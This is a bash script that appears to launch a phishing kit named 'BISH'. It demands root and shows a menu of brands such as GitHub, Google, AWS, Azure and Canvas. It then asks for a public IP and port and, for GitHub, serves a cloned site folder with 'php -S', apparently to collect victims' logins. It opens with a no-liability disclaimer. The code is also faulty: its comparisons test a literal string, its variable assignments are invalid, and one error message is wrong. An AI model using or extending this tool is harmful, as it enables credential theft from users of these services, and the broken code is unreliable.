#!/bin/bash

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
reset=`tput sgr0`



require_root() {
  if [ "$(id -u)" != "0" ]; then
    printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: NOT root)${reset} \n \n" 1>&2
    exit 1
  fi
}


required_packages() {
command -v php > /dev/null || printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: php NOT INSTALLED)${reset} \n \n"
command -v mysql > /dev/null || printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: php NOT INSTALLED)${reset} \n \n"
}


disclaimer() {
printf "\n                ${red}DEVELOPERS HOLD NO LIABILLITY FOR MISUSE OF BISH${reset} \n \n"
}


options() {
clear
printf "\n \n      ${yellow}[§${green}GitHub${reset}${yellow}§]${reset}            ${yellow}[§${green}Google${reset}${yellow}§]${reset}          ${yellow}[§${green}GitLab${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}Replit${reset}${yellow}§]${reset}            ${yellow}[§${green}Skyward${reset}${yellow}§]${reset}         ${yellow}[§${green}LightSpeedSystems${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}PythonAnywhere${reset}${yellow}§]${reset}    ${yellow}[§${green}Linode${reset}${yellow}§]${reset}          ${yellow}[§${green}AWS${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}MicrosoftAzure${reset}${yellow}§]${reset}    ${yellow}[§${green}DigitalOcean${reset}${yellow}§]${reset}    ${yellow}[§${green}Canvas${reset}${yellow}§]${reset} \n"


}

input() {
read -p "Please choose an option $ " user_choice
read -p "Please enter your public IP address $ " pubip
read -p "Please enter a port number $ " portnum
}

input_processing() {

if [ user_choice = "GitHub\n" ]; then
site = github
printf "$site \n"
cd sites/github
php -S $pubip:$portnum

elif [ user_choice = "Google\n" ]; then
site = google
printf "$site \n"

elif [ user_choice = "GitLab\n" ]; then
site = gitlab
printf "$site \n"

elif [ user_choice = "Replit\n" ]; then
site = replit
printf "$site \n"

elif [ user_choice = "Skyward\n" ]; then
site = skyward
printf "$site \n"

elif [ user_choice = "LightSpeedSystems\n" ]; then
site = lightspeedsystems
printf "$site \n"

elif [ user_choice = "PythonAnywhere\n" ]; then
site = pythonanywhere
printf "$site \n"

elif [ user_choice = "Linode\n" ]; then
site = linode
printf "$site \n"

elif [ user_choice = "AWS\n" ]; then
site = aws
printf "$site \n"

elif [ user_choice = "MicrosoftAzure\n" ]; then
site = microsoftazure
printf "$site \n"

elif [ user_choice = "DigitalOcean\n" ]; then
site = digitalocean
printf "$site \n"

elif [ user_choice = "Canvas\n" ]; then
site = canvas
printf "$site \n"

fi
}


require_root
required_packages
disclaimer
options
input
input_processing







